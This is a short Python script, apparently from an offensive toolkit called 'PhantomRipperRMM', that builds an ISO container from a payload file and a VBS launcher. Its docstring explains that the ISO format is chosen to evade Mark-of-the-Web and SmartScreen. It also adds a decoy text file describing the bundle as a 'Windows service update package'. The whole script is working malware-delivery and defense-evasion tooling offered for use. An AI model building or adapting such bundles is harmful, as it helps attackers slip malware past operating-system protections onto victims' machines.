#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhantomRipperRMM — ISO container builder (pycdlib).

Builds a Joliet+RockRidge ISO from a payload + launcher pair. Windows mounts
ISO images natively and Mark-of-the-Web never propagates through the mount,
so SmartScreen's downloaded-file trigger never fires on the contents.

Usage:
  python iso_builder.py --out bundle.iso --payload payload.pyw --launcher PHANTOM.VBS
"""

import argparse

import pycdlib


def build(out_path, payload_path, launcher_path, volname="PHANTOM"):
    iso = pycdlib.PyCdlib()
    iso.new(interchange_level=3, joliet=3)

    iso.add_file(payload_path, iso_path="/PAYLOAD_.PYW;1", joliet_path="/payload.pyw")
    iso.add_file(launcher_path, iso_path="/PHANTOM.VBS;1", joliet_path="/PHANTOM.VBS")
    import io
    note = io.BytesIO(b"Windows service update package.\r\n")
    iso.add_fp(note, 34, iso_path="/UPDATE.TX_;1", joliet_path="/UPDATE.TXT")

    iso.write(out_path)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--payload", required=True)
    ap.add_argument("--launcher", required=True)
    ap.add_argument("--volname", default="PHANTOM")
    args = ap.parse_args()
    build(args.out, args.payload, args.launcher, args.volname)
    print("[+] iso -> %s" % args.out)


if __name__ == "__main__":
    main()
